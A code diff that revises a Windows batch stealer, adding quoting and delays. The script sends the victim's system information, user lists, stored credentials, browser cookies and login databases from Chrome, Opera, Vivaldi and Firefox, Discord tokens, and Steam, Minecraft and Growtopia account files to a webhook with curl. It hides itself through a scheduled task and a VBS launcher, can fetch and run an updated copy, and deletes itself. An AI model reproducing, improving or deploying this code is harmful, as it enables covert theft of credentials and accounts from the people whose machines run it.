@@ -6,7 +6,7 @@ goto remove_this_if_you_agree_to_follow_the_TOS
 
 :: If using onlogin on task scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
 goto skipadministrator
-if not "%cd%"=="%vpath%" (
+if not "%~dp0"=="%vpath%\" (
 	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 )
 :skipadministrator
@@ -33,90 +33,101 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 :: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipsysteminfocapture
-	set tempsys=%appdata%\sysinfo.txt
-	2>NUL SystemInfo > %tempsys%
-	curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
-	2>NUL del %tempsys%
+	set "tempsys=%appdata%\sysinfo.txt"
+	2>NUL SystemInfo > "%tempsys%"
+	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
+	2>NUL del "%tempsys%"
 :skipsysteminfocapture
 
 :: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skiptasklist
-	set temptasklist=%appdata%\tasklist.txt
-	2>NUL tasklist > %temptasklist%
-	curl --silent --output /dev/null -F tasks=@%temptasklist% %webhook%
-	2>NUL del %temptasklist%
+	set "temptasklist=%appdata%\tasklist.txt"
+	2>NUL tasklist > "%temptasklist%"
+	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
+	2>NUL del "%temptasklist%"
 :skiptasklist
 
 :: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipnetuser
-	set netuser=%appdata%\netuser.txt
-	2>NUL net user > %netuser%
-	curl --silent --output /dev/null -F tasks=@%netuser% %webhook%
-	2>NUL del %netuser%
+	set "netuser=%appdata%\netuser.txt"
+	2>NUL net user > "%netuser%"
+	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
+	2>NUL del "%netuser%"
 :skipnetuser
 
 :: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipquser
-	set quser=%appdata%\quser.txt
-	2>NUL quser > %quser%
-	curl --silent --output /dev/null -F tasks=@%quser% %webhook%
-	2>NUL del %quser%
-:skipnetuser
-
+	set "quser=%appdata%\quser.txt"
+	2>NUL quser > "%quser%"
+	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
+	2>NUL del "%quser%"
+:skipquser
 :: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipcmdkey
-	set cmdkey=%appdata%\cmdkey.txt
-	2>NUL cmdkey /list > %cmdkey%
-	curl --silent --output /dev/null -F tasks=@%cmdkey% %webhook%
-	2>NUL del %cmdkey%
-:skipnetuser
+	set "cmdkey=%appdata%\cmdkey.txt"
+	2>NUL cmdkey /list > "%cmdkey%"
+	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
+	2>NUL del "%cmdkey%"
+:skipcmdkey
 
 :: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------
 goto skipchrome
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
-	curl --silent --output /dev/null -F c=@%localappdata%\Google\Chrome\User" "Data\Default\Cookies %webhook%
-	curl --silent --output /dev/null -F h=@%localappdata%\Google\Chrome\User" "Data\Default\History %webhook%
-	curl --silent --output /dev/null -F s=@%localappdata%\Google\Chrome\User" "Data\Default\Shortcuts %webhook%
-	curl --silent --output /dev/null -F b=@%localappdata%\Google\Chrome\User" "Data\Default\Bookmarks %webhook%
-	curl --silent --output /dev/null -F l=@%localappdata%\Google\Chrome\User" "Data\Default\Login" "Data %webhook%
+	curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
+	curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
+	timeout /t 2 /nobreak > NUL
+	curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
+	curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
+	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 :skipchrome
 
 :: OPERA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: -----------------------------------------------------
 goto skipopera
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
-	curl --silent --output /dev/null -F c=@%appdata%\Opera" "Software\Opera" "Stable\Cookies %webhook%
-	curl --silent --output /dev/null -F h=@%appdata%\Opera" "Software\Opera" "Stable\History %webhook%
-	curl --silent --output /dev/null -F s=@%appdata%\Opera" "Software\Opera" "Stable\Shortcuts %webhook%
-	curl --silent --output /dev/null -F b=@%appdata%\Opera" "Software\Opera" "Stable\Bookmarks %webhook%
-	curl --silent --output /dev/null -F l=@%appdata%\Opera" "Software\Opera" "Stable\Login" "Data %webhook%
+	curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
+	curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
+	timeout /t 2 /nobreak > NUL
+	curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
+	curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
+	curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 :skipopera
 
 :: VIVALDI - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: -------------------------------------------------------
 goto skipvivaldi
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- VIVALDI -```\"}"  %webhook%
-	curl --silent --output /dev/null -F c=@%localappdata%\Vivaldi\User" "Data\Default\Cookies %webhook%
-	curl --silent --output /dev/null -F h=@%localappdata%\Vivaldi\User" "Data\Default\History %webhook%
-	curl --silent --output /dev/null -F s=@%localappdata%\Vivaldi\User" "Data\Default\Shortcuts %webhook%
-	curl --silent --output /dev/null -F b=@%localappdata%\Vivaldi\User" "Data\Default\Bookmarks %webhook%
-	curl --silent --output /dev/null -F l=@%localappdata%\Vivaldi\User" "Data\Default\Login" "Data %webhook%
+	curl --silent --output /dev/null -F c=@"%localappdata%\Vivaldi\User Data\Default\Cookies" %webhook%
+	curl --silent --output /dev/null -F h=@"%localappdata%\Vivaldi\User Data\Default\History" %webhook%
+	timeout /t 2 /nobreak > NUL
+	curl --silent --output /dev/null -F s=@"%localappdata%\Vivaldi\User Data\Default\Shortcuts" %webhook%
+	curl --silent --output /dev/null -F b=@"%localappdata%\Vivaldi\User Data\Default\Bookmarks" %webhook%
+	curl --silent --output /dev/null -F l=@"%localappdata%\Vivaldi\User Data\Default\Login Data" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 :skipvivaldi
 
 :: FIREFOX - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: -------------------------------------------------------
 goto skipfirefox
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
-for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
-	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json %webhook%
-	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db %webhook%
-	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db %webhook%
-	curl --silent --output /dev/null -F level=@%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite %webhook%
+for /f %%f in ('dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
+	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
+	timeout /t 2 /nobreak > NUL
+	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %webhook%
+	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db" %webhook%
+	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 	)
 )
 :skipfirefox
@@ -125,17 +136,19 @@ for /f %%f in ('dir /b %appdata%\Mozilla\Firefox\Profiles') do (
 :: ----------------------------------------------------
 goto skiposu
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- osu! -```\"}"  %webhook%
-	curl --silent --output /dev/null -F c=@%localappdata%\osu!\osu!.%username%.cfg %webhook%
+	curl --silent --output /dev/null -F c=@"%localappdata%\osu!\osu!.%username%.cfg" %webhook%
 :skiposu
 
 :: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: -------------------------------------------------------
 goto skipdiscord
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
-for /f %%f in ('dir /b %appdata%\discord\Local" "Storage\leveldb\') do (
+for /f %%f in ('dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
 	echo %%f|find ".ldb"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F level=@%appdata%\discord\Local" "Storage\leveldb\%%f %webhook%
+		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
+		
+		timeout /t 2 /nobreak > NUL
 	)
 )
 :skipdiscord
@@ -144,20 +157,22 @@ for /f %%f in ('dir /b %appdata%\discord\Local" "Storage\leveldb\') do (
 :: -----------------------------------------------------
 goto skipsteam
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
-	curl --silent --output /dev/null -F steamusers=@C:\Program" "Files" "(x86)\Steam\config\loginusers.vdf %webhook%
-	curl --silent --output /dev/null -F loginusers=@C:\Program" "Files\Steam\config\loginusers.vdf %webhook%
-for /f %%s in ('dir /b C:\Program" "Files" "(x86)\Steam\') do (
+	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
+	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
+for /f %%s in ('dir /b "C:\Program Files (x86)\Steam\"') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
-		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
+		
+		timeout /t 2 /nobreak > NUL
 	)
 )
-for /f %%s in ('dir /b /a:h C:\Program" "Files" "(x86)\Steam\') do (
+for /f %%s in ('dir /b "C:\Program Files\Steam\"') do (
 	echo %%s|find "ssfn"
 	if errorlevel 1 (@echo off) else (
-		curl --silent --output /dev/null -F auth=@C:\Program" "Files" "(x86)\Steam\%%s %webhook%
-		curl --silent --output /dev/null -F auth=@C:\Program" "Files\Steam\%%s %webhook%
+		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
+		
+		timeout /t 2 /nobreak > NUL
 	)
 )
 :skipsteam
@@ -166,15 +181,19 @@ for /f %%s in ('dir /b /a:h C:\Program" "Files" "(x86)\Steam\') do (
 :: ---------------------------------------------------------
 goto skipminecraft
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
-	curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
-	curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_accounts.json %webhook%
+	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
+	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 :skipminecraft
 
 :: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
 goto skipgrowtopia
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
-	curl --silent --output /dev/null -F save.dat=@%localappdata%\Growtopia\save.dat %webhook%
+	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
+	
+	timeout /t 2 /nobreak > NUL
 :skipgrowtopia
 
 :: OTHER
@@ -188,9 +207,9 @@ set "recurring=false"
 goto skiprecurring
 
 :: Change attributes to make editing files possible
->NUL attrib -h %vpath%\%bname%
->NUL attrib -h %vpath%\%uname%
->NUL attrib -h %vpath%\%vname%
+>NUL attrib -h "%vpath%\%uname%"
+>NUL attrib -h "%vpath%\%bname%"
+>NUL attrib -h "%vpath%\%vname%"
 
 :: MINUTE (1 - 1439 minutes), HOURLY (1 - 23 hours), DAILY (1 - 365 days), WEEKLY (1 - 52 weeks), MONTHLY (1 - 12 months/ lastday), ONCE, ONSTART (REQUIRE ADMINISTRATOR), ONLOGON (REQUIRE ADMINISTRATOR
 set "when=Daily"
@@ -208,23 +227,24 @@ set "updateurl="
 	:: Target computer's username (Case sensitive) | Leave blank to skip.
 	set "targetusername="
 	
-:: Path to the hide location
-set "vpath=%appdata%\Microsoft\Windows"
+:: Path to the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that.
+set "vpath=C:\ProgramData"
 
 2>NUL del /ah "%vpath%\%uname%"
 2>NUL del /ah "%vpath%\%vname%"
 
 :: Copy the batch to the hidden location
-if not "%cd%"=="%vpath%" (
+if not "%~dp0"=="%vpath%\" (
+pause
  2>NUL del /ah "%vpath%\%bname%"
   >NUL copy "%~f0" "%vpath%\%bname%"
 )
 
 if "%updateurl%"=="" (
 	:normalrecurring
-	echo set WshShell = wscript.createobject^("WScript.shell"^)> %vpath%\%vname%
-	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> %vpath%\%vname%
-	echo set WshShell = Nothing>> %vpath%\%vname%
+	echo set WshShell = wscript.createobject^("WScript.shell"^)> "%vpath%\%vname%"
+	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> "%vpath%\%vname%"
+	echo set WshShell = Nothing>> "%vpath%\%vname%"
 	
 	:: DO NOT REMOVE
 	goto skipupdateconfig
@@ -243,45 +263,42 @@ goto dontremoveme2
 :nontargetedupdate
 :: TARGET USERNAME IS NOT SET, UPDATING ON EVERY COMPUTER
 
-IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
+	IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"
 
-:: Change VBS
-echo set WshShell = wscript^.createobject^("WScript.shell"^)> %vpath%\%vname%
-echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> %vpath%\%vname%
-echo set WshShell = Nothing>> %vpath%\%vname%
+	:: Change VBS
+	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
+	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
+	echo set WshShell = Nothing>> "%vpath%\%vname%"
 
-:: Make updater batch
-echo ^@echo off> %vpath%\%uname%
-echo cd %vpath%>> %vpath%\%uname%
-echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
-echo ^>NUL attrib -h %bname%>> %vpath%\%uname%
-echo ^>NUL attrib -h %uname%>> %vpath%\%uname%
-echo ^>NUL attrib -h %vname%>> %vpath%\%uname%
-echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> %vpath%\temp.txt>> %vpath%\%uname%
-echo :wl>> %vpath%\%uname%
-echo IF EXIST "%vpath%\temp.txt" GOTO w2>> %vpath%\%uname%
-echo timeout /t 1 >> %vpath%\%uname%
-echo goto wl>> %vpath%\%uname%
-echo :w2>> %vpath%\%uname%
-echo 2^>NUL del %bname%>> %vpath%\%uname%
-echo ren temp.txt %bname%>> %vpath%\%uname%
-echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
-echo break^>%vname%>> %vpath%\%uname%
-echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
-echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
-echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
-echo start %vname%>> %vpath%\%uname%
-echo timeout 1 ^>nul>> %vpath%\%uname%
-echo break^>%vname%>> %vpath%\%uname%
-echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
-echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
-echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
-echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
-echo ^>NUL attrib %vpath%\%bname% +h>> %vpath%\%uname%
-echo ^>NUL attrib %vpath%\%uname% +h>> %vpath%\%uname%
-echo call ^:d ^& exit /b>> %vpath%\%uname%
-echo :d>> %vpath%\%uname%
-echo start ^/b "" cmd ^/c 2^>NUL del %vpath%\%uname%^&exit /b>> %vpath%\%uname%
+	:: Make updater batch
+	echo ^@echo off> "%vpath%\%uname%"
+	echo cd "%vpath%">> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
+	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo :wl>> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
+	echo timeout /t 1 >> "%vpath%\%uname%"
+	echo goto wl>> "%vpath%\%uname%"
+	echo :w2>> "%vpath%\%uname%"
+	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
+	echo ren temp.txt %bname%>> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo break^>%vname%>> "%vpath%\%uname%"
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo start %vname%>> "%vpath%\%uname%"
+	echo timeout 1 ^>nul>> "%vpath%\%uname%"
+	echo break^>%vname%>> "%vpath%\%uname%"
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
 
 goto skipupdateconfig
 :dontremoveme2
@@ -292,46 +309,43 @@ goto dontremoveme3
 
 IF "%USERNAME%"=="%targetusername%" (
 
-	IF EXIST "%vpath%\temp.txt" 2>NUL del %vpath%\temp.txt
+	IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"
 
 	:: Change VBS
-	echo set WshShell = wscript^.createobject^("WScript.shell"^)> %vpath%\%vname%
-	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> %vpath%\%vname%
-	echo set WshShell = Nothing>> %vpath%\%vname%
+	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
+	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
+	echo set WshShell = Nothing>> "%vpath%\%vname%"
 
 	:: Make updater batch
-	echo ^@echo off> %vpath%\%uname%
-	echo cd %vpath%>> %vpath%\%uname%
-	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
-	echo ^>NUL attrib -h %bname%>> %vpath%\%uname%
-	echo ^>NUL attrib -h %uname%>> %vpath%\%uname%
-	echo ^>NUL attrib -h %vname%>> %vpath%\%uname%
-	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> %vpath%\temp.txt>> %vpath%\%uname%
-	echo :wl>> %vpath%\%uname%
-	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> %vpath%\%uname%
-	echo timeout /t 1 >> %vpath%\%uname%
-	echo goto wl>> %vpath%\%uname%
-	echo :w2>> %vpath%\%uname%
-	echo 2^>NUL del %bname%>> %vpath%\%uname%
-	echo ren temp.txt %bname%>> %vpath%\%uname%
-	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del %vpath%\temp.txt>> %vpath%\%uname%
-	echo break^>%vname%>> %vpath%\%uname%
-	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
-	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
-	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
-	echo start %vname%>> %vpath%\%uname%
-	echo timeout 1 ^>nul>> %vpath%\%uname%
-	echo break^>%vname%>> %vpath%\%uname%
-	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> %vpath%\%vname%>> %vpath%\%uname%
-	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> %vpath%\%vname%>> %vpath%\%uname%
-	echo echo set WshShell = Nothing^>^> %vpath%\%vname%>> %vpath%\%uname%
-	echo ^>NUL attrib %vpath%\%vname% +h>> %vpath%\%uname%
-	echo ^>NUL attrib %vpath%\%bname% +h>> %vpath%\%uname%
-	echo ^>NUL attrib %vpath%\%uname% +h>> %vpath%\%uname%
-	echo call ^:d ^& exit /b>> %vpath%\%uname%
-	echo :d>> %vpath%\%uname%
-	echo start ^/b "" cmd ^/c 2^>NUL del %vpath%\%uname%^&exit /b>> %vpath%\%uname%
-	
+	echo ^@echo off> "%vpath%\%uname%"
+	echo cd "%vpath%">> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
+	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
+	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo :wl>> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
+	echo timeout /t 1 >> "%vpath%\%uname%"
+	echo goto wl>> "%vpath%\%uname%"
+	echo :w2>> "%vpath%\%uname%"
+	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
+	echo ren temp.txt %bname%>> "%vpath%\%uname%"
+	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
+	echo break^>%vname%>> "%vpath%\%uname%"
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo start %vname%>> "%vpath%\%uname%"
+	echo timeout 1 ^>nul>> "%vpath%\%uname%"
+	echo break^>%vname%>> "%vpath%\%uname%"
+	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
+	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
+
 	goto skipupdateconfig
 ) else ( goto normalrecurring )
 :dontremoveme3
@@ -339,7 +353,7 @@ IF "%USERNAME%"=="%targetusername%" (
 :skipupdateconfig
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
->NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
+>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr %vpath%\%vname%
 IF NOT ERRORLEVEL 1 (
 	:: DO NOT EDIT, INFO FOR WEBHOOK
 	set "recurring=true, %when%"
@@ -349,9 +363,9 @@ IF NOT ERRORLEVEL 1 (
 )
 
 :: Hide batch & VBS
->NUL attrib %vpath%\%vname% +h
->NUL attrib %vpath%\%bname% +h
->NUL attrib %vpath%\%uname% +h
+>NUL attrib "%vpath%\%vname%" +h
+>NUL attrib "%vpath%\%bname%" +h
+>NUL attrib "%vpath%\%uname%" +h
 
 :: END OF RECURRING METHOD
 :: -----------------------
@@ -364,7 +378,7 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 :: SELF DELETE AFTER EXECUTION
 :: ---------------------------
 goto skipselfdelete
-if not "%cd%"=="%vpath%" (
+if not "%~dp0"=="%vpath%\" (
 	call :d & exit /b
 	:d
 	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
